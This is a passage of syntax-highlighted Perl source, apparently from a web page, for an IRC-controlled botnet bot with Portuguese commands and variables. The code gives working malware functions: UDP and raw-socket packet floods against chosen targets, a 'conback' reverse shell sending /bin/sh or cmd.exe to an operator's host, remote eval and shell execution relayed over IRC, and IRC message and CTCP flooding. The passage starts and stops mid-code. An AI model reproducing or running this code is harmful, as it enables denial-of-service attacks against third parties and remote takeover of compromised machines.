inet_aton(<span class=\"string\">&quot;$faixaip.$faixa&quot;</span>);</span><br><span class=\"line\">                  $pacote=$rand <span class=\"keyword\">x</span> $rand <span class=\"keyword\">x</span> $rand;</span><br><span class=\"line\">                  $porta = <span class=\"keyword\">int</span>(<span class=\"keyword\">rand</span> <span class=\"number\">65000</span>) +<span class=\"number\">1</span> <span class=\"keyword\">if</span> ($porta == <span class=\"string\">&quot;0&quot;</span>);</span><br><span class=\"line\">                  <span class=\"keyword\">send</span>(Tr0x, <span class=\"number\">0</span>, $pacote, sockaddr_in($porta, $alvo)) <span class=\"keyword\">and</span> $pacotese++ <span class=\"keyword\">if</span> ($pacotes == <span class=\"string\">&quot;1&quot;</span>);</span><br><span class=\"line\">                  <span class=\"keyword\">if</span> ($faixa &gt;= <span class=\"number\">255</span>) &#123;</span><br><span class=\"line\">                    $faixa = <span class=\"number\">1</span>;</span><br><span class=\"line\">                  &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">              &#125;</span><br><span class=\"line\">              <span class=\"keyword\">if</span> ($estatisticas)</span><br><span class=\"line\">              &#123;</span><br><span class=\"line\">               sendraw($IRC_cur_socket, <span class=\"string\">&quot;PRIVMSG $printl :\\002Tempo de Pacotes\\002: $tempo&quot;</span>.<span class=\"string\">&quot;s&quot;</span>);</span><br><span class=\"line\">               sendraw($IRC_cur_socket, <span class=\"string\">&quot;PRIVMSG $printl :\\002Total de Pacotes\\002: $pacotese&quot;</span>);</span><br><span class=\"line\">               sendraw($IRC_cur_socket, <span class=\"string\">&quot;PRIVMSG $printl :\\002Alvo dos Pacotes\\002: $alvo&quot;</span>);</span><br><span class=\"line\">              &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">elsif</span> ($funcarg =~ <span class=\"regexp\">/^conback\\s+(.*)\\s+(\\d+)/</span>) &#123;</span><br><span class=\"line\">              <span class=\"keyword\">my</span> $host = <span class=\"string\">&quot;$1&quot;</span>;</span><br><span class=\"line\">              <span class=\"keyword\">my</span> $porta = <span class=\"string\">&quot;$2&quot;</span>;</span><br><span class=\"line\">              <span class=\"keyword\">my</span> $proto = <span class=\"keyword\">getprotobyname</span>(<span class=\"string\">&#x27;tcp&#x27;</span>);</span><br><span class=\"line\">              <span class=\"keyword\">my</span> $iaddr = inet_aton($host);</span><br><span class=\"line\">              <span class=\"keyword\">my</span> $paddr = sockaddr_in($porta, $iaddr);</span><br><span class=\"line\">              <span class=\"keyword\">my</span> $shell = <span class=\"string\">&quot;/bin/sh -i&quot;</span>;</span><br><span class=\"line\">              <span class=\"keyword\">if</span> ($^O eq <span class=\"string\">&quot;MSWin32&quot;</span>) &#123;</span><br><span class=\"line\">                $shell = <span class=\"string\">&quot;cmd.exe&quot;</span>;</span><br><span class=\"line\">              &#125;</span><br><span class=\"line\">              <span class=\"keyword\">socket</span>(SOCKET, PF_INET, SOCK_STREAM, $proto) <span class=\"keyword\">or</span> <span class=\"keyword\">die</span> <span class=\"string\">&quot;socket: $!&quot;</span>;</span><br><span class=\"line\">              <span class=\"keyword\">connect</span>(SOCKET, $paddr) <span class=\"keyword\">or</span> <span class=\"keyword\">die</span> <span class=\"string\">&quot;connect: $!&quot;</span>;</span><br><span class=\"line\">              <span class=\"keyword\">open</span>(STDIN, <span class=\"string\">&quot;&gt;&amp;SOCKET&quot;</span>);</span><br><span class=\"line\">              <span class=\"keyword\">open</span>(STDOUT, <span class=\"string\">&quot;&gt;&amp;SOCKET&quot;</span>);</span><br><span class=\"line\">              <span class=\"keyword\">open</span>(STDERR, <span class=\"string\">&quot;&gt;&amp;SOCKET&quot;</span>);</span><br><span class=\"line\">              <span class=\"keyword\">system</span>(<span class=\"string\">&quot;$shell&quot;</span>);</span><br><span class=\"line\">              <span class=\"keyword\">close</span>(STDIN);</span><br><span class=\"line\">              <span class=\"keyword\">close</span>(STDOUT);</span><br><span class=\"line\">              <span class=\"keyword\">close</span>(STDERR);</span><br><span class=\"line\"></span><br><span class=\"line\">              <span class=\"keyword\">if</span> ($estatisticas)</span><br><span class=\"line\">              &#123;</span><br><span class=\"line\">               sendraw($IRC_cur_socket, <span class=\"string\">&quot;PRIVMSG $printl :\\002Conectando-se em\\002: $host:$porta&quot;</span>);</span><br><span class=\"line\">              &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">           <span class=\"keyword\">elsif</span> ($funcarg =~ <span class=\"regexp\">/^oldpack\\s+(.*)\\s+(\\d+)\\s+(\\d+)/</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">unless</span> $pacotes;</span><br><span class=\"line\">             <span class=\"keyword\">my</span> ($dtime, %pacotes) = attacker(<span class=\"string\">&quot;$1&quot;</span>, <span class=\"string\">&quot;$2&quot;</span>, <span class=\"string\">&quot;$3&quot;</span>);</span><br><span class=\"line\">             $dtime = <span class=\"number\">1</span> <span class=\"keyword\">if</span> $dtime == <span class=\"number\">0</span>;</span><br><span class=\"line\">             <span class=\"keyword\">my</span> %bytes;</span><br><span class=\"line\">             $bytes<span class=\"string\">&#123;igmp&#125;</span> = $2 * $pacotes<span class=\"string\">&#123;igmp&#125;</span>;</span><br><span class=\"line\">             $bytes<span class=\"string\">&#123;icmp&#125;</span> = $2 * $pacotes<span class=\"string\">&#123;icmp&#125;</span>;</span><br><span class=\"line\">             $bytes<span class=\"string\">&#123;o&#125;</span> = $2 * $pacotes<span class=\"string\">&#123;o&#125;</span>;</span><br><span class=\"line\">             $bytes<span class=\"string\">&#123;udp&#125;</span> = $2 * $pacotes<span class=\"string\">&#123;udp&#125;</span>;</span><br><span class=\"line\">             $bytes<span class=\"string\">&#123;tcp&#125;</span> = $2 * $pacotes<span class=\"string\">&#123;tcp&#125;</span>;</span><br><span class=\"line\">             <span class=\"keyword\">unless</span> ($estatisticas)</span><br><span class=\"line\">             &#123;</span><br><span class=\"line\">               sendraw($IRC_cur_socket, <span class=\"string\">&quot;PRIVMSG $printl :\\002 - Status -\\002&quot;</span>);</span><br><span class=\"line\">               sendraw($IRC_cur_socket, <span class=\"string\">&quot;PRIVMSG $printl :\\002Timp\\002: $dtime&quot;</span>.<span class=\"string\">&quot;secunde.&quot;</span>);</span><br><span class=\"line\">               sendraw($IRC_cur_socket, <span class=\"string\">&quot;PRIVMSG $printl :\\002Total packet\\002: &quot;</span>.($pacotes<span class=\"string\">&#123;udp&#125;</span> + $pacotes<span class=\"string\">&#123;igmp&#125;</span> + $pacotes<span class=\"string\">&#123;icmp&#125;</span> +  $pacotes<span class=\"string\">&#123;o&#125;</span>));</span><br><span class=\"line\">               sendraw($IRC_cur_socket, <span class=\"string\">&quot;PRIVMSG $printl :\\002Total bytes\\002: &quot;</span>.($bytes<span class=\"string\">&#123;icmp&#125;</span> + $bytes <span class=\"string\">&#123;igmp&#125;</span> + $bytes<span class=\"string\">&#123;udp&#125;</span> + $bytes<span class=\"string\">&#123;o&#125;</span>));</span><br><span class=\"line\">               sendraw($IRC_cur_socket, <span class=\"string\">&quot;PRIVMSG $printl :\\002Flood\\002: &quot;</span>.int((($bytes<span class=\"string\">&#123;icmp&#125;</span>+$bytes<span class=\"string\">&#123;igmp&#125;</span>+$bytes<span class=\"string\">&#123;udp&#125;</span> + $bytes<span class=\"string\">&#123;o&#125;</span>)/<span class=\"number\">1024</span>)/$dtime).<span class=\"string\">&quot; kbps&quot;</span>);</span><br><span class=\"line\">             &#125;</span><br><span class=\"line\">           &#125;</span><br><span class=\"line\">           <span class=\"keyword\">exit</span>;</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">ircase</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">my</span> ($kem, $printl, $case) = @_;</span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"keyword\">if</span> ($case =~ <span class=\"regexp\">/^join (.*)/</span>) &#123;</span><br><span class=\"line\">     j(<span class=\"string\">&quot;$1&quot;</span>);</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   <span class=\"keyword\">elsif</span> ($case =~ <span class=\"regexp\">/^part (.*)/</span>) &#123;</span><br><span class=\"line\">      p(<span class=\"string\">&quot;$1&quot;</span>);</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   <span class=\"keyword\">elsif</span> ($case =~ <span class=\"regexp\">/^rejoin\\s+(.*)/</span>) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">my</span> $chan = $1;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ($chan =~ <span class=\"regexp\">/^(\\d+) (.*)/</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">my</span> $ca = <span class=\"number\">1</span>; $ca &lt;= $1; $ca++ ) &#123;</span><br><span class=\"line\">          p(<span class=\"string\">&quot;$2&quot;</span>);</span><br><span class=\"line\">          j(<span class=\"string\">&quot;$2&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">          p(<span class=\"string\">&quot;$chan&quot;</span>);</span><br><span class=\"line\">          j(<span class=\"string\">&quot;$chan&quot;</span>);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   <span class=\"keyword\">elsif</span> ($case =~ <span class=\"regexp\">/^op/</span>) &#123;</span><br><span class=\"line\">      op(<span class=\"string\">&quot;$printl&quot;</span>, <span class=\"string\">&quot;$kem&quot;</span>) <span class=\"keyword\">if</span> $case eq <span class=\"string\">&quot;op&quot;</span>;</span><br><span class=\"line\">      <span class=\"keyword\">my</span> $oarg = <span class=\"keyword\">substr</span>($case, <span class=\"number\">3</span>);</span><br><span class=\"line\">      op(<span class=\"string\">&quot;$1&quot;</span>, <span class=\"string\">&quot;$2&quot;</span>) <span class=\"keyword\">if</span> ($oarg =~ <span class=\"regexp\">/(\\S+)\\s+(\\S+)/</span>);</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   <span class=\"keyword\">elsif</span> ($case =~ <span class=\"regexp\">/^deop/</span>) &#123;</span><br><span class=\"line\">      deop(<span class=\"string\">&quot;$printl&quot;</span>, <span class=\"string\">&quot;$kem&quot;</span>) <span class=\"keyword\">if</span> $case eq <span class=\"string\">&quot;deop&quot;</span>;</span><br><span class=\"line\">      <span class=\"keyword\">my</span> $oarg = <span class=\"keyword\">substr</span>($case, <span class=\"number\">5</span>);</span><br><span class=\"line\">      deop(<span class=\"string\">&quot;$1&quot;</span>, <span class=\"string\">&quot;$2&quot;</span>) <span class=\"keyword\">if</span> ($oarg =~ <span class=\"regexp\">/(\\S+)\\s+(\\S+)/</span>);</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   <span class=\"keyword\">elsif</span> ($case =~ <span class=\"regexp\">/^voice/</span>) &#123;</span><br><span class=\"line\">      voice(<span class=\"string\">&quot;$printl&quot;</span>, <span class=\"string\">&quot;$kem&quot;</span>) <span class=\"keyword\">if</span> $case eq <span class=\"string\">&quot;voice&quot;</span>;</span><br><span class=\"line\">      $oarg = <span class=\"keyword\">substr</span>($case, <span class=\"number\">6</span>);</span><br><span class=\"line\">      voice(<span class=\"string\">&quot;$1&quot;</span>, <span class=\"string\">&quot;$2&quot;</span>) <span class=\"keyword\">if</span> ($oarg =~ <span class=\"regexp\">/(\\S+)\\s+(\\S+)/</span>);</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   <span class=\"keyword\">elsif</span> ($case =~ <span class=\"regexp\">/^devoice/</span>) &#123;</span><br><span class=\"line\">      devoice(<span class=\"string\">&quot;$printl&quot;</span>, <span class=\"string\">&quot;$kem&quot;</span>) <span class=\"keyword\">if</span> $case eq <span class=\"string\">&quot;devoice&quot;</span>;</span><br><span class=\"line\">      $oarg = <span class=\"keyword\">substr</span>($case, <span class=\"number\">8</span>);</span><br><span class=\"line\">      devoice(<span class=\"string\">&quot;$1&quot;</span>, <span class=\"string\">&quot;$2&quot;</span>) <span class=\"keyword\">if</span> ($oarg =~ <span class=\"regexp\">/(\\S+)\\s+(\\S+)/</span>);</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   <span class=\"keyword\">elsif</span> ($case =~ <span class=\"regexp\">/^msg\\s+(\\S+) (.*)/</span>) &#123;</span><br><span class=\"line\">      msg(<span class=\"string\">&quot;$1&quot;</span>, <span class=\"string\">&quot;$2&quot;</span>);</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   <span class=\"keyword\">elsif</span> ($case =~ <span class=\"regexp\">/^flood\\s+(\\d+)\\s+(\\S+) (.*)/</span>) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">for</span> (<span class=\"keyword\">my</span> $cf = <span class=\"number\">1</span>; $cf &lt;= $1; $cf++) &#123;</span><br><span class=\"line\">        msg(<span class=\"string\">&quot;$2&quot;</span>, <span class=\"string\">&quot;$3&quot;</span>);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   <span class=\"keyword\">elsif</span> ($case =~ <span class=\"regexp\">/^ctcpflood\\s+(\\d+)\\s+(\\S+) (.*)/</span>) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">for</span> (<span class=\"keyword\">my</span> $cf = <span class=\"number\">1</span>; $cf &lt;= $1; $cf++) &#123;</span><br><span class=\"line\">        ctcp(<span class=\"string\">&quot;$2&quot;</span>, <span class=\"string\">&quot;$3&quot;</span>);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   <span class=\"keyword\">elsif</span> ($case =~ <span class=\"regexp\">/^ctcp\\s+(\\S+) (.*)/</span>) &#123;</span><br><span class=\"line\">      ctcp(<span class=\"string\">&quot;$1&quot;</span>, <span class=\"string\">&quot;$2&quot;</span>);</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   <span class=\"keyword\">elsif</span> ($case =~ <span class=\"regexp\">/^invite\\s+(\\S+) (.*)/</span>) &#123;</span><br><span class=\"line\">      invite(<span class=\"string\">&quot;$1&quot;</span>, <span class=\"string\">&quot;$2&quot;</span>);</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   <span class=\"keyword\">elsif</span> ($case =~ <span class=\"regexp\">/^nick (.*)/</span>) &#123;</span><br><span class=\"line\">      nick(<span class=\"string\">&quot;$1&quot;</span>);</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   <span class=\"keyword\">elsif</span> ($case =~ <span class=\"regexp\">/^conecta\\s+(\\S+)\\s+(\\S+)/</span>) &#123;</span><br><span class=\"line\">       conectar(<span class=\"string\">&quot;$2&quot;</span>, <span class=\"string\">&quot;$1&quot;</span>, <span class=\"number\">6667</span>);</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   <span class=\"keyword\">elsif</span> ($case =~ <span class=\"regexp\">/^send\\s+(\\S+)\\s+(\\S+)/</span>) &#123;</span><br><span class=\"line\">      DCC::SEND(<span class=\"string\">&quot;$1&quot;</span>, <span class=\"string\">&quot;$2&quot;</span>);</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   <span class=\"keyword\">elsif</span> ($case =~ <span class=\"regexp\">/^raw (.*)/</span>) &#123;</span><br><span class=\"line\">      sendraw(<span class=\"string\">&quot;$1&quot;</span>);</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   <span class=\"keyword\">elsif</span> ($case =~ <span class=\"regexp\">/^eval (.*)/</span>) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">eval</span> <span class=\"string\">&quot;$1&quot;</span>;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   <span class=\"keyword\">elsif</span> ($case =~ <span class=\"regexp\">/^entra\\s+(\\S+)\\s+(\\d+)/</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">sleep</span> <span class=\"keyword\">int</span>(<span class=\"keyword\">rand</span>($2));</span><br><span class=\"line\">    j(<span class=\"string\">&quot;$1&quot;</span>);</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   <span class=\"keyword\">elsif</span> ($case =~ <span class=\"regexp\">/^sai\\s+(\\S+)\\s+(\\d+)/</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">sleep</span> <span class=\"keyword\">int</span>(<span class=\"keyword\">rand</span>($2));</span><br><span class=\"line\">    p(<span class=\"string\">&quot;$1&quot;</span>);</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   <span class=\"keyword\">elsif</span> ($case =~ <span class=\"regexp\">/^sair/</span>) &#123;</span><br><span class=\"line\">     quit();</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   <span class=\"keyword\">elsif</span> ($case =~ <span class=\"regexp\">/^novonick/</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">my</span> $novonick = getnick();</span><br><span class=\"line\">     nick(<span class=\"string\">&quot;$novonick&quot;</span>);</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   <span class=\"keyword\">elsif</span> ($case =~ <span class=\"regexp\">/^estatisticas (.*)/</span>) &#123;</span><br><span class=\"line\">     <span class=\"keyword\">if</span> ($1 eq <span class=\"string\">&quot;on&quot;</span>) &#123;</span><br><span class=\"line\">      $estatisticas = <span class=\"number\">1</span>;</span><br><span class=\"line\">      msg(<span class=\"string\">&quot;$printl&quot;</span>, <span class=\"string\">&quot;Estat.sticas ativadas!&quot;</span>);</span><br><span class=\"line\">     &#125; <span class=\"keyword\">elsif</span> ($1 eq <span class=\"string\">&quot;off&quot;</span>) &#123;</span><br><span class=\"line\">      $estatisticas = <span class=\"number\">0</span>;</span><br><span class=\"line\">      msg(<span class=\"string\">&quot;$printl&quot;</span>, <span class=\"string\">&quot;Estat.sticas desativadas!&quot;</span>);</span><br><span class=\"line\">     &#125;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   <span class=\"keyword\">elsif</span> ($case =~ <span class=\"regexp\">/^pacotes (.*)/</span>) &#123;</span><br><span class=\"line\">     <span class=\"keyword\">if</span> ($1 eq <span class=\"string\">&quot;on&quot;</span>) &#123;</span><br><span class=\"line\">      $pacotes = <span class=\"number\">1</span>;</span><br><span class=\"line\">      msg(<span class=\"string\">&quot;$printl&quot;</span>, <span class=\"string\">&quot;Pacotes ativados!&quot;</span>) <span class=\"keyword\">if</span> ($estatisticas == <span class=\"string\">&quot;1&quot;</span>);</span><br><span class=\"line\">     &#125; <span class=\"keyword\">elsif</span> ($1 eq <span class=\"string\">&quot;off&quot;</span>) &#123;</span><br><span class=\"line\">      $pacotes = <span class=\"number\">0</span>;</span><br><span class=\"line\">      msg(<span class=\"string\">&quot;$printl&quot;</span>, <span class=\"string\">&quot;Pacotes desativados!&quot;</span>) <span class=\"keyword\">if</span> ($estatisticas == <span class=\"string\">&quot;1&quot;</span>);</span><br><span class=\"line\">     &#125;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">shell</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"keyword\">unless</span> $acessoshell;</span><br><span class=\"line\">  <span class=\"keyword\">my</span> $printl=$_[<span class=\"number\">0</span>];</span><br><span class=\"line\">  <span class=\"keyword\">my</span> $comando=$_[<span class=\"number\">1</span>];</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ($comando =~ <span class=\"regexp\">/cd (.*)/</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">chdir</span>(<span class=\"string\">&quot;$1&quot;</span>) || msg(<span class=\"string\">&quot;$printl&quot;</span>, <span class=\"string\">&quot;Diret.rio inexistente!&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">elsif</span> ($pid = <span class=\"keyword\">fork</span>) &#123;</span><br><span class=\"line\">     <span class=\"keyword\">waitpid</span>($pid, <span class=\"number\">0</span>);</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (<span class=\"keyword\">fork</span>) &#123;</span><br><span class=\"line\">         <span class=\"keyword\">exit</span>;</span><br><span class=\"line\">       &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">           <span class=\"keyword\">my</span> @resp=<span class=\"string\">`$comando 2&gt;&amp;1 3&gt;&amp;1`</span>;</span><br><span class=\"line\">           <span class=\"keyword\">my</span> $c=<span class=\"number\">0</span>;</span><br><span class=\"line\">           <span class=\"keyword\">foreach</span> <span class=\"keyword\">my</span> $linha (@resp) &#123;</span><br><span class=\"line\">             $c++;</span><br><span class=\"line\">             <span class=\"keyword\">chop</span> $linha;</span><br><span class=\"line\">             sendraw($IRC_cur_socket, <span class=\"string\">&quot;PRIVMSG $printl :$linha&quot;</span>);</span><br><span class=\"line\">             <span class=\"keyword\">if</span> ($c &gt;= <span class=\"string\">&quot;$linas_max&quot;</span>) &#123;</span><br><span class=\"line\">               $c=<span class=\"number\">0</span>;</span><br><span class=\"line\">               <span class=\"keyword\">sleep</span> $sleep;</span><br><span class=\"line\">             &#125;</span><br><span class=\"line\">           &#125;</span><br><span class=\"line\">           <span class=\"keyword\">exit</span>;</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">attacker</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">my</span> $iaddr = inet_aton($_[<span class=\"number\">0</span>]);</span><br><span class=\"line\">  <span class=\"keyword\">my</span> $msg = <span class=\"string\">&#x27;B&#x27;</span> <span class=\"keyword\">x</span> $_[<span class=\"number\">1</span>];</span><br><span class=\"line\">  <span class=\"keyword\">my</span> $ftime = $_[<span class=\"number\">2</span>];</span><br><span class=\"line\">  <span class=\"keyword\">my</span> $cp = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">my</span> (%pacotes);</span><br><span class=\"line\">  $pacotes<span class=\"string\">&#123;icmp&#125;</span> = $pacotes<span class=\"string\">&#123;igmp&#125;</span> = $pacotes<span class=\"string\">&#123;udp&#125;</span> = $pacotes<span class=\"string\">&#123;o&#125;</span> = $pacotes<span class=\"string\">&#123;tcp&#125;</span> = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">socket</span>(SOCK1, PF_INET, SOCK_RAW, <span class=\"number\">2</span>) <span class=\"keyword\">or</span> $cp++;</span><br><span class=\"line\">  <span class=\"keyword\">socket</span>(SOCK2, PF_INET, SOCK_DGRAM, <span class=\"number\">17</span>) <span class=\"keyword\">or</span> $cp++;</span><br><span class=\"line\">  <span class=\"keyword\">socket</span>(SOCK3, PF_INET, SOCK_RAW, <span class=\"number\">1</span>) <span class=\"keyword\">or</span> $cp++;</span><br><span class=\"line\">  <span class=\"keyword\">socket</span>(SOCK4, PF_INET, SOCK_RAW, <span class=\"number\">6</span>) <span class=\"keyword\">or</span> $cp++;</span><br><span class=\"line\">  <span class=\"keyword\">return</span>(<span class=\"keyword\">undef</span>) <span class=\"keyword\">if</span> $cp == <span class=\"number\">4</span>;</span><br><span class=\"line\">  <span class=\"keyword\">my</span> $itime = <span class=\"keyword\">time</span>;</span><br><span class=\"line\">  <span class=\"keyword\">my</span> ($cur_time);</span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( <span class=\"number\">1</span> ) &#123;</span><br><span class=\"line\">     <span class=\"keyword\">for</span> (<span class=\"keyword\">my</span> $porta = <span class=\"number\">1</span>; $porta &lt;= <span class=\"number\">65535</span>; $porta++) &#123;</span><br><span class=\"line\">       $cur_time = <span class=\"keyword\">time</span> - $itime;</span><br><span class=\"line\">       <span class=\"keyword\">last</span> <span class=\"keyword\">if</span> $cur_time &gt;= $ftime;</span><br><span class=\"line\">       <span class=\"keyword\">send</span>(SOCK1, $msg, <span class=\"number\">0</span>, sockaddr_in($porta, $iaddr)) <span class=\"keyword\">and</span> $pacotes<span class=\"string\">&#123;igmp&#125;</span>++ <span class=\"keyword\">if</span> ($pacotes == <span class=\"number\">1</span>);</span><br><span class=\"line\">       <span class=\"keyword\">send</span>(SOCK2, $msg, <span class=\"number\">0</span>, sockaddr_in($porta, $iaddr)) <span class=\"keyword\">and</span> $pacotes<span class=\"string\">&#123;udp&#125;</span>++ <span class=\"keyword\">if</span> ($pacotes == <span class=\"number\">1</span>);</span><br><span class=\"line\">       <span class=\"keyword\">send</span>(SOCK3, $msg, <span class=\"number\">0</span>, sockaddr_in($porta, $iaddr)) <span class=\"keyword\">and</span> $pacotes<span class=\"string\">&#123;icmp&#125;</span>++ <span class=\"keyword\">if</span> ($pacotes == <span class=\"number\">1</span>);</span><br><span class=\"line\">       <span class=\"keyword\">send</span>(SOCK4, $msg, <span class=\"number\">0</span>, sockaddr_in($porta, $iaddr)) <span class=\"keyword\">and</span> $pacotes<span class=\"string\">&#123;tcp&#125;</span>++ <span class=\"keyword\">if</span> ($pacotes == <span class=\"number\">1</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">       <span class=\"keyword\">for</span> (<span class=\"keyword\">my</span> $pc = <span class=\"number\">3</span>; $pc &lt;= <span class=\"number\">255</span>;$pc++) &#123;</span><br><span class=\"line\">         <span class=\"keyword\">next</span> <span class=\"keyword\">if</span> $pc == <span class=\"number\">6</span>;</span><br><span class=\"line\">         $cur_time = <span class=\"keyword\">time</span> - $itime;</span><br><span class=\"line\">         <span class=\"keyword\">last</span> <span class=\"keyword\">if</span> $cur_time &gt;= $ftime;</span><br><span class=\"line\">         <span class=\"keyword\">socket</span>(SOCK5, PF_INET, SOCK_RAW, $pc) <span class=\"keyword\">or</span> <span class=\"keyword\">next</span>;</span><br><span class=\"line\">         <span class=\"keyword\">send</span>(SOCK5, $msg, <span class=\"number\">0</span>, sockaddr_in($porta, $iaddr)) <span class=\"keyword\">and</span> $pacotes<span class=\"string\">&#123;o&#125;</span>++ <span class=\"keyword\">if</span> ($pacotes == <span class=\"number\">1</span>);</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\">     &#125;</span><br><span class=\"line\">     <span class=\"keyword\">last</span> <span class=\"keyword\">if</span> $cur_time &gt;= $ftime;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span>($cur_time, %pacotes);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">action</span> </span>&#123;</span><br><span class=\"line\">   <span class=\"keyword\">return</span> <span class=\"keyword\">unless</span> $#_ == <span class=\"number\">1</span>;</span><br><span class=\"line\">   sendraw(<span class=\"string\">&quot;PRIVMSG $_[0] :\\001ACTION $_[1]\\001&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">ctcp</span> </span>&#123;</span><br><span class=\"line\">   <span class=\"keyword\">return</span> <span class=\"keyword\">unless</span> $#_ == <span class=\"number\">1</span>;</span><br><span class=\"line\">   sendraw(<span class=\"string\">&quot;PRIVMSG $_[0] :\\001$_[1]\\001&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">msg</span> </span>&#123;</span><br><span class=\"line\">   <span class=\"keyword\">return</span> <span class=\"keyword\">unless</span> $#_ == <span class=\"number\">1</span>;</span><br><span class=\"line\">   sendraw(<span class=\"string\">&quot;PRIVMSG $_[0] :$_[1]&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">notice</span> </span>&#123;</span><br><span class=\"line\">   <span class=\"keyword\">return</span> <span class=\"keyword\">unless</span> $#_ == <span class=\"number\">1</span>;</span><br><span class=\"line\">   sendraw(<span class=\"string\">&quot;NOTICE $_[0] :$_[1]&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">op</span> </span>&#123;</span><br><span class=\"line\">   <span class=\"keyword\">return</span> <span class=\"keyword\">unless</span> $#_ == <span class=\"number\">1</span>;</span><br><span class=\"line\">   sendraw(<span class=\"string\">&quot;MODE $_[0] +o $_[1]&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">deop</span> </span>&#123;</span><br><span class=\"line\">   <span class=\"keyword\">return</span> <span class=\"keyword\">unless</span> $#_ == <span class=\"number\">1</span>;</span><br><span class=\"line\">   sendraw(<span class=\"string\">&quot;MODE $_[0] -o $_[1]&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">hop</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">unless</span> $#_ == <span class=\"number\">1</span>;</span><br><span class=\"line\">   sendraw(<span class=\"string\">&quot;MODE $_[0] +h $_[1]&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">dehop</span> </span>&#123;</span><br><span class=\"line\">   <span class=\"keyword\">return</span> <span 